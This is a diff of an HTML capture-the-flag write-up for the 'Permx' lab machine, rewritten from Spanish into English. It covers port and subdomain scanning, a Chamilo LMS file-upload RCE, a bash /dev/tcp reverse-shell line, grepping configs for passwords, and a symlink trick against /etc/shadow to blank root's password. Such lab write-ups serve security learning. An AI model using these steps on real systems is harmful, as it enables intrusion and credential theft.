@@ -7,6 +7,89 @@
   <link rel="stylesheet" href="../../assets/css/writeups_style.css" type="text/css" />
 </head>
 <body>
-<div class='page'><h1 class='title'>Permx</h1><br/><p>Escaneo de puertos</p><p></p><p>	<strong>nmap -sVC -p- --open -sS --min-rate 5000 -v -n -Pn -oN permx_scan 10.10.11.23</strong></p><p></p><p>Puertos 22 (SSH) y 80 (HTTP) abiertos</p><p></p><p><img src="images/128-1.png" alt="images/128-1.png" /></p><p></p><p>Añadido a /etc/hosts</p><p></p><p>Como directorios encuentro esto</p><p></p><p><img src="images/128-2.png" alt="images/128-2.png" /></p><p></p><p>	<strong>whatweb </strong><strong><a href="http://permx.htb:80/">http://permx.htb:80/</a></strong>	</p><p>	<a href="http://permx.htb:80/">http://permx.htb:80/</a> [200 OK] Apache[2.4.52], Bootstrap, Country[RESERVED][ZZ], Email[permx@htb.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.10.11.23], 				JQuery[3.4.1], Script, Title[eLEARNING]</p><p>     </p><p>Encuentro 2 subdominios</p><p></p><p>	<strong>ffuf -u </strong><strong><a href="http://permx.htb/">http://permx.htb/</a></strong><strong> -H &quot;Host: FUZZ.permx.htb&quot; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -mc 200 -s</strong></p><p></p><p><img src="images/128-3.png" alt="images/128-3.png" /></p><p></p><p></p><p><img src="images/128-4.png" alt="images/128-4.png" /></p><p></p><p>En lms.permx.htb encuentro un login</p><p></p><p><img src="images/128-5.png" alt="images/128-5.png" /></p><p></p><p>Es la versión 1 de Chamilo</p><p></p><p>Chamilo  es vulnearable a es vulnerable a Unauthenticated  Upload File RCE</p><p></p><p>Encuentro un POC</p><p></p><p><a href="https://starlabs.sg/advisories/23/23-4220/">https://starlabs.sg/advisories/23/23-4220/</a></p><p></p><p>Tendré que crear un rce en php </p><p></p><p><img src="images/128-6.png" alt="images/128-6.png" /></p><p></p><p>Subimos el archivo con curl</p><p></p><p><img src="images/128-7.png" alt="images/128-7.png" /></p><p></p><p>Le envio una solicitud para ver si funcionó</p><p></p><p><img src="images/128-8.png" alt="images/128-8.png" /></p><p></p><p>Ahora envio el condigo para el reverse shell </p><p></p><p>	<strong>bash -c &quot;bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0&gt;&amp;1&quot;</strong></p><p></p><p>Lo tengo que encodear para poder mandarlo en la url y lo entienda</p><p></p><p>Obtengo el shell, estamos como el usuario www-data</p><p></p><p><img src="images/128-9.png" alt="images/128-9.png" /></p><p></p><p>Veo que existe el usuario mtz pero no puedo acceder a el</p><p><img src="images/128-10.png" alt="images/128-10.png" /></p><p></p><p>El siguiente paso sería acceder al usuario mtz y desde ahí escalar privilegios</p><p></p><p>encontramos la ruta /var/www/chamilo/app/config que puede contener datos interesantes</p><p></p><p>Con el comando <strong>cat * | grep &quot;pass&quot;</strong> hago que se me muestre todas las lineas que contienen la palabra pass de todos los archivos del directorio actual</p><p></p><p>Encontramos unas password de una db</p><p></p><p><img src="images/128-11.png" alt="images/128-11.png" /></p><p></p><p>Intento usar esta pass para el usuario mtz</p><p></p><p>Consigo la conexión con el usuario mtz a través de SSH</p><p></p><p><img src="images/128-12.png" alt="images/128-12.png" /></p><p></p><p>Con sudo -l veo que puedo ejecutar</p><p></p><p><img src="images/128-13.png" alt="images/128-13.png" /></p><p></p><p>Veo lo que hace  esta script como administrador</p><p></p><p><img src="images/128-14.png" alt="images/128-14.png" /></p><p></p><p>La script sirve para  dar permisos a un archivo dentro de  la ruta /home/mtz/*</p><p></p><p>La idea sería cambiar los permisos de /etc/shadow para poder ver el hash del root</p><p></p><p>Pero como no podemos lo más probable es que tengamos que crear un enlacen  simbólico en el home de mtz hacia el archivo que quiero ver o modificar</p><p></p><p><img src="images/128-15.png" alt="images/128-15.png" /></p><p></p><p>Editamos el archivo shadow para quitarle la pass a root</p><p></p><p><img src="images/128-16.png" alt="images/128-16.png" /></p><p></p><p><img src="images/128-17.png" alt="images/128-17.png" /></p><p></p><p>Al quitarle la  password podemos entrar como root</p><p></p><p><img src="images/128-18.png" alt="images/128-18.png" /></p></div>
+<div class="page">
+
+<h1 class="title">Permx</h1>
+
+<section>
+<h2>Reconnaissance</h2>
+<p>The assessment began with a full TCP port scan to identify exposed services on the target host.</p>
+<pre><code>nmap -sVC -p- --open -sS --min-rate 5000 -v -n -Pn -oN permx_scan 10.10.11.23</code></pre>
+<p>The scan revealed two open ports: 22 (SSH) and 80 (HTTP).</p>
+<p><img src="images/128-1.png" alt="images/128-1.png" /></p>
+<p>The domain name was added to the local <code>/etc/hosts</code> file to properly resolve the virtual host.</p>
+</section>
+
+<section>
+<h2>Enumeration</h2>
+<p>Directory and application enumeration was performed against the web service.</p>
+<p><img src="images/128-2.png" alt="images/128-2.png" /></p>
+<p>Using WhatWeb, the underlying technologies of the web application were identified.</p>
+<pre><code>whatweb http://permx.htb:80/</code></pre>
+<p>The output indicated an Apache server hosting an e-learning platform.</p>
+<p>Further enumeration focused on discovering virtual hosts and subdomains.</p>
+<pre><code>ffuf -u http://permx.htb/ -H "Host: FUZZ.permx.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -mc 200 -s</code></pre>
+<p><img src="images/128-3.png" alt="images/128-3.png" /></p>
+<p><img src="images/128-4.png" alt="images/128-4.png" /></p>
+<p>Two subdomains were discovered, one of which was <code>lms.permx.htb</code>.</p>
+<p>Accessing this subdomain revealed a login panel.</p>
+<p><img src="images/128-5.png" alt="images/128-5.png" /></p>
+<p>The application was identified as Chamilo LMS version 1.</p>
+<p>This version of Chamilo is known to be vulnerable to an unauthenticated arbitrary file upload leading to remote code execution.</p>
+<p>A public proof of concept describing this vulnerability was found.</p>
+<p><a href="https://starlabs.sg/advisories/23/23-4220/">https://starlabs.sg/advisories/23/23-4220/</a></p>
+</section>
+
+<section>
+<h2>Exploitation</h2>
+<p>Based on the proof of concept, a malicious PHP file was created to achieve remote code execution.</p>
+<p><img src="images/128-6.png" alt="images/128-6.png" /></p>
+<p>The file was uploaded to the server using a crafted request with curl.</p>
+<p><img src="images/128-7.png" alt="images/128-7.png" /></p>
+<p>A request was sent to the uploaded file to confirm that code execution was working.</p>
+<p><img src="images/128-8.png" alt="images/128-8.png" /></p>
+<p>After confirming execution, a reverse shell payload was prepared.</p>
+<pre><code>bash -c "bash -i >&amp; /dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0>&amp;1"</code></pre>
+<p>The payload was URL-encoded to ensure correct interpretation when sent through the request.</p>
+<p>A reverse shell was successfully obtained, running as the <code>www-data</code> user.</p>
+<p><img src="images/128-9.png" alt="images/128-9.png" /></p>
+</section>
+
+<section>
+<h2>Post-Exploitation Analysis</h2>
+<p>Local enumeration revealed the existence of another user account named <code>mtz</code>, although direct access was not possible at this stage.</p>
+<p><img src="images/128-10.png" alt="images/128-10.png" /></p>
+<p>The next objective was to pivot to the <code>mtz</code> user in order to escalate privileges.</p>
+<p>While exploring the filesystem, the directory <code>/var/www/chamilo/app/config</code> was identified as potentially containing sensitive information.</p>
+<p>To locate credentials, all files in the directory were searched for lines containing the word <code>pass</code>.</p>
+<pre><code>cat * | grep "pass"</code></pre>
+<p>This revealed database credentials stored in configuration files.</p>
+<p><img src="images/128-11.png" alt="images/128-11.png" /></p>
+<p>Password reuse was attempted using these credentials.</p>
+<p>The reused password allowed successful SSH authentication as the user <code>mtz</code>.</p>
+<p><img src="images/128-12.png" alt="images/128-12.png" /></p>
+</section>
+
+<section>
+<h2>Privilege Escalation</h2>
+<p>Once logged in as <code>mtz</code>, sudo privileges were enumerated.</p>
+<p><img src="images/128-13.png" alt="images/128-13.png" /></p>
+<p>The output showed that a custom script could be executed with root privileges.</p>
+<p>The script was inspected to understand its behavior.</p>
+<p><img src="images/128-14.png" alt="images/128-14.png" /></p>
+<p>The script was designed to modify permissions of files located under <code>/home/mtz/*</code>.</p>
+<p>An initial idea was to directly change permissions on <code>/etc/shadow</code>, but this was not allowed.</p>
+<p>Instead, a symbolic link was created inside the home directory pointing to the target file.</p>
+<p><img src="images/128-15.png" alt="images/128-15.png" /></p>
+<p>By leveraging the script, permissions on the linked <code>/etc/shadow</code> file were modified.</p>
+<p>The shadow file was then edited to remove the root password hash.</p>
+<p><img src="images/128-16.png" alt="images/128-16.png" /></p>
+<p><img src="images/128-17.png" alt="images/128-17.png" /></p>
+<p>With the root password removed, it was possible to switch to the root user without authentication.</p>
+<p><img src="images/128-18.png" alt="images/128-18.png" /></p>
+</section>
+
+</div>
 </body>
+
 </html>
